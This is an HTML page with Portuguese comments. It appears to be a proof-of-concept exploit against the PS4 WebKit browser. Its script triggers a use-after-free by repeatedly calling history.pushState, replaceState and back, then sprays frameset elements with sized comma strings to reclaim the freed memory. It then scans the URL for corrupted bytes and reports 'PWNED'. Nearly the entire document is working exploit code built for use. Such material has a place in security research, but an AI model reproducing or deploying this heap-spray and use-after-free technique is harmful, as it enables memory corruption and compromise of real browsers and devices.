<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit - Instant Reclaim (High Priority)</title>
<style>
    body { background-color: #000; color: #ff00ff; font-family: monospace; padding: 20px; }
    button { 
        padding: 20px; width: 100%; margin-bottom: 10px;
        font-weight: bold; font-size: 16px; cursor: pointer; 
        border: 2px solid #f0f; background: #202; color: #fff;
        text-transform: uppercase;
    }
    #log { border: 1px solid #555; margin-top: 20px; padding: 10px; white-space: pre-wrap; height: 350px; overflow-y: scroll;}
</style>
</head>
<body>
<h2>PS4 WebKit - Instant Reclaim (680KB Frameset)</h2>
<div id="status">Pronto. Lógica original restaurada.</div>

<button onclick="runInstantExploit()">INICIAR ATAQUE SEM DELAY</button>

<div id="log"></div>

<script>
const logEl = document.getElementById("log");
const statusEl = document.getElementById("status");
function log(m) { 
    const d = document.createElement("div");
    d.textContent = m;
    logEl.appendChild(d);
    logEl.scrollTop = logEl.scrollHeight;
}
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

var keepAlive = [];

async function runInstantExploit() {
    logEl.innerHTML = "";
    keepAlive = []; 
    statusEl.innerText = "Rodando...";

    log("1. Preparando Spray (Pré-cálculo)...");
    
    // PREPARAMOS OS PAYLOADS ANTES DO UAF PARA NÃO PERDER TEMPO DEPOIS
    // Alvo: 680KB (UTF-16) -> ~85.000 vírgulas
    let payloads = [];
    const START = 84500;
    const END = 85500;
    
    for(let i = START; i < END; i+=8) {
        try {
            payloads.push(",".repeat(i));
        } catch(e) {}
    }
    log(`Payloads prontos: ${payloads.length} variações de tamanho.`);

    // === FASE 1: TRIGGER UAF (ORIGINAL) ===
    log("2. Disparando UAF Gigante...");
    
    let size = 977;
    const STEP = 14461;

    for(let i = 0; i < 48; i++) {
        let frag = "V".repeat(size); 
        history.pushState({}, "", "#" + frag);
        // O WebKit dobra isso para 680KB internamente (UTF-16)
        history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
        
        if(i % 6 === 0) {
            // O GATILHO CRÍTICO
            setTimeout(() => history.back(), 0);
        }
        
        // SE FOR A ÚLTIMA ITERAÇÃO, NÃO ESPERE!
        if (i === 47) {
            log(">>> JANELA CRÍTICA ABERTA - SPRAY IMEDIATO <<<");
            // REMOVIDO: await sleep(50); 
            // AGORA: Spray síncrono violento
            doSpray(payloads);
        } else {
            size += STEP;
            await sleep(5); // Pequeno sleep só para as iterações de preparação
        }
    }
    
    await sleep(100); // Espera agora só para ver o resultado

    // === FASE 3: VERIFICAÇÃO ===
    checkResult();
}

function doSpray(payloads) {
    // Executa o mais rápido possível
    for(let i=0; i < payloads.length; i++) {
        let f = document.createElement("frameset");
        f.rows = payloads[i];
        keepAlive.push(f);
    }
}

function checkResult() {
    statusEl.innerText = "Verificando...";
    let url = document.URL;
    let changed = false;
    let sample = "";
    
    // Procura por qualquer coisa que NÃO seja 'V'
    for(let i=1000; i<5000; i++) {
        if(url.charCodeAt(i) !== 0x56) { // 0x56 é 'V'
            changed = true;
            for(let k=0; k<16; k++) {
                sample += url.charCodeAt(i+k).toString(16).padStart(2,'0') + " ";
            }
            break;
        }
    }

    if(changed) {
        log("!!! JACKPOT !!!", "success");
        log("Memória Reclamada!");
        log("Dados: " + sample);
        statusEl.innerText = "PWNED";
        statusEl.style.backgroundColor = "#00aa00";
    } else {
        log("Falha: Ainda vendo apenas 'V'.");
        log("Dica: Se falhar, tente clicar várias vezes seguidas para forçar congestionamento.");
    }
}
</script>
</body>
</html>
